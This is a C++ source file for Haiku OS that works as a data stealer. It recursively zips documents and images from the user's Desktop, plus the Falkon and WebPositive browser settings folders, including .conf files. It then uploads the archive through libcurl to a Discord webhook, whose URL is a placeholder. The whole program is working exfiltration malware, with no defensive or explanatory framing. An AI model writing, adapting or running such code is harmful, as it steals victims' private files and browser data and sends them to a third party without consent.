#include <FindDirectory.h>
#include <Path.h>
#include <Directory.h>
#include <Entry.h>
#include <File.h>
#include <curl/curl.h>
#include <zip.h>
#include <iostream>
#include <string>
#include <unordered_set>
#include <vector>

// Discord Webhook URL
const std::string webhook_url = "https://discord.com/api/webhooks/yourwebhookhere";

// Function to get the user's Desktop directory
void get_desktop_directory(BPath &path) {
    if (find_directory(B_USER_DIRECTORY, &path) == B_OK) {
        path.Append("Desktop"); // Get Desktop path
        std::cout << "Desktop directory: " << path.Path() << std::endl;
    } else {
        perror("Could not find user directory");
    }
}

// Helper function to check if the file extension is valid
bool is_valid_file_type(const std::string &file_path) {
    std::unordered_set<std::string> valid_extensions = { "txt", "jpg", "jpeg", "png", "pdf", "docx", "conf" }; // Add .conf here
    std::string extension = file_path.substr(file_path.find_last_of(".") + 1);
    return valid_extensions.find(extension) != valid_extensions.end();
}

// Add file to zip, only valid file types will be added
void add_file_to_zip(zip_t *zip, const std::string &file_path, const std::string &relative_path) {
    if (!is_valid_file_type(file_path)) {
        std::cout << "Skipping invalid file type: " << file_path << std::endl;
        return;
    }

    std::cout << "Adding file to zip: " << file_path << std::endl;
    
    BFile file(file_path.c_str(), B_READ_ONLY);
    if (file.InitCheck() != B_OK) {
        std::cerr << "Could not open file: " << file_path << std::endl;
        return;
    }

    off_t file_size;
    file.GetSize(&file_size);

    std::vector<char> buffer(file_size);
    file.Read(buffer.data(), file_size);

    zip_source_t *source = zip_source_buffer(zip, buffer.data(), file_size, 0);
    if (source == nullptr || zip_file_add(zip, relative_path.c_str(), source, ZIP_FL_OVERWRITE | ZIP_FL_ENC_UTF_8) < 0) {
        std::cerr << "Error adding file to zip: " << file_path << std::endl;
        if (source != nullptr) {
            zip_source_free(source);
        }
    }
}

// Traverse directory and add valid files to zip, avoid rechecking files
void zip_directory(zip_t *zip, const char *dir_path, const std::string &base_path, std::unordered_set<std::string> &processed_files) {
    BDirectory directory(dir_path);
    if (directory.InitCheck() != B_OK) {
        std::cerr << "Could not open directory: " << dir_path << std::endl;
        return;
    }

    BEntry entry;
    while (directory.GetNextEntry(&entry, true) == B_OK) {
        BPath path;
        entry.GetPath(&path);

        // Skip if file has already been processed
        if (processed_files.find(path.Path()) != processed_files.end()) {
            continue;
        }

        processed_files.insert(path.Path()); // Remember this file as processed

        if (entry.IsDirectory()) {
            zip_directory(zip, path.Path(), base_path + "/" + path.Leaf(), processed_files);
        } else if (entry.IsFile()) {
            add_file_to_zip(zip, path.Path(), base_path + "/" + path.Leaf());
        }
    }
}

// Send zip file to Discord Webhook
void send_zip_to_webhook(const std::string &zip_path, const std::string &message) {
    std::cout << "Sending zip file to Discord webhook: " << zip_path << std::endl;

    CURL *curl = curl_easy_init();
    if (!curl) {
        throw std::runtime_error("Could not initialize libcurl.");
    }

    CURLcode res;
    struct curl_slist *headers = nullptr;
    headers = curl_slist_append(headers, "Content-Type: multipart/form-data");

    curl_mime *mime = curl_mime_init(curl);
    curl_mimepart *part = curl_mime_addpart(mime);
    curl_mime_name(part, "file");
    curl_mime_filedata(part, zip_path.c_str());

    // Append the message as a part of the request
    curl_mimepart *text_part = curl_mime_addpart(mime);
    curl_mime_name(text_part, "content");
    curl_mime_data(text_part, message.c_str(), message.length());

    curl_easy_setopt(curl, CURLOPT_URL, webhook_url.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        std::cerr << "CURL error: " << curl_easy_strerror(res) << std::endl;
    } else {
        std::cout << "Zip file sent successfully!" << std::endl;
    }

    curl_mime_free(mime);
    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);
}

int main() {
    BPath desktop_path;
    
    // Get the user's Desktop directory using your method
    get_desktop_directory(desktop_path);

    // Output zip file path (single zip file for everything)
    std::string zip_file = desktop_path.Path();  // Desktop zip file path
    zip_file += "/all_files.zip"; // Combined zip file for Desktop, Falkon, WebPositive

    std::cout << "Creating zip file..." << std::endl;

    // Create a single zip file to store all content
    zip_t *zip_handle = zip_open(zip_file.c_str(), ZIP_CREATE | ZIP_TRUNCATE, nullptr);
    if (!zip_handle) {
        std::cerr << "Could not create zip file: " << zip_file << std::endl;
        return 1;
    }

    std::unordered_set<std::string> processed_files; // Set to keep track of processed files

    // 1) Process Desktop files and add them to the zip
    std::cout << "Processing Desktop files..." << std::endl;
    zip_directory(zip_handle, desktop_path.Path(), "", processed_files);

    // 2) Falkon config files
    BPath falkon_path;
    if (find_directory(B_USER_SETTINGS_DIRECTORY, &falkon_path) == B_OK) {
        std::string falkon_dir = falkon_path.Path() + std::string("/falkon"); // Falkon config directory
        std::cout << "Processing Falkon config files..." << std::endl;
        zip_directory(zip_handle, falkon_dir.c_str(), "falkon", processed_files);
    } else {
        std::cerr << "Could not find Falkon configuration directory!" << std::endl;
    }

    // 3) WebPositive config files
    BPath webpositive_path;
    if (find_directory(B_USER_SETTINGS_DIRECTORY, &webpositive_path) == B_OK) {
        std::string webpositive_dir = webpositive_path.Path() + std::string("/WebPositive"); // WebPositive config directory
        std::cout << "Processing WebPositive config files..." << std::endl;
        zip_directory(zip_handle, webpositive_dir.c_str(), "webpositive", processed_files);
    } else {
        std::cerr << "Could not find WebPositive configuration directory!" << std::endl;
    }

    // Close the zip file
    if (zip_close(zip_handle) != 0) {
        std::cerr << "Could not close zip file." << std::endl;
        return 1;
    }

    std::cout << "Zip file created successfully!" << std::endl;

    // 4) Send the zip file to Discord
    send_zip_to_webhook(zip_file, "Here are the Desktop, Falkon, and WebPositive files.");

    return 0;
}
